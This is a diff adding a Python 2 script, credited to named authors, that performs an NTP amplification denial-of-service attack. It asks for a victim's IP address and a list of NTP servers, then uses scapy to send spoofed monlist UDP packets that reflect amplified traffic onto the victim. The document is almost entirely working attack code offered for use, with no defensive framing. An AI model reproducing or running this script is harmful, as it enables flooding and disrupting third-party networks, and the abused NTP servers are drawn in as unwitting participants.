@@ -1,0 +1,120 @@
+#!/usr/bin/env python2
+
+from scapy.all import *
+import threading
+import os
+import sys
+import socket
+
+
+print  """
+NTP Amplification DoS Attack
+Programmed by: dotcppfile and Red Dragon
+Twitter: https://twitter.com/dotcppfile
+Twitter: https://twitter.com/mattybedds
+Greetings: Team Prophetic
+"""
+
+
+#Data to send
+ntpdata = "\x17\x00\x03\x2a" + "\x00" * 4
+#...
+
+
+#Used to hold the total number of packets sent
+ps = 0
+#...
+
+
+#Gets the victim's Ip
+victimsip = raw_input("> Victim's Ip Address: ")
+#...
+
+
+#Checks if the NTP servers list exists
+filename = raw_input("> Your NTP Servers List: ")
+
+fileexist = True
+fileexist = os.path.exists(filename)
+if fileexist == False:
+    print "The File: " + filename + " doesn't Exist"
+    sys.exit()
+#...
+
+
+#Gets the new name of the new NTP List
+newlistsname = raw_input("> Name of your New List: ")
+#...
+
+
+#Gets number of packets to send to each NTP server
+number = raw_input("> Number of Packets to Send: ")
+#...
+
+
+#Loads each line of the list in an Array
+with open(filename, 'r') as f:
+    myLinks = [line.strip() for line in f]
+#...
+
+
+#Checks for duplicates
+newList = []
+newList = list(set(myLinks)) 
+newList.sort(key=myLinks.index)
+#...
+
+
+#Prints the list
+print "\nList:"
+for x in range(0, len(newList)):
+    print "%s" % (newList[x])
+#...
+
+
+#Extra
+print "\nInformation:"
+newList2 = []
+#...
+
+
+#Multi Threading Class
+class attack(threading.Thread):
+
+    def __init__ (self, theserver):
+        threading.Thread.__init__(self)
+        self.theserver = theserver
+
+    def run(self):
+        global ps
+        try:
+            sendp(IP(dst=self.theserver,src=victimsip, ttl=(1,int(number)))/UDP(sport=48947,dport=123)/Raw(load=ntpdata))
+            ps += int(number)
+            newList2.append(self.theserver)
+        except:
+            print "Failed to send packets to %r" % self.theserver
+#...
+
+
+#Declares, starts, appends and waits for each thread to finish
+threads = []
+for j in newList:
+    thread = attack(j)
+    thread.start()
+    threads.append(thread)
+
+for thread in threads:
+    thread.join()
+#...
+
+
+#Writing the working servers to newlistsname
+with open(newlistsname, 'w') as f:
+    for s in newList2:
+        f.write(s + '\n')
+#...
+
+
+#Prints how many packets were sent
+print "\n%d packets were sent." % ps
+#...
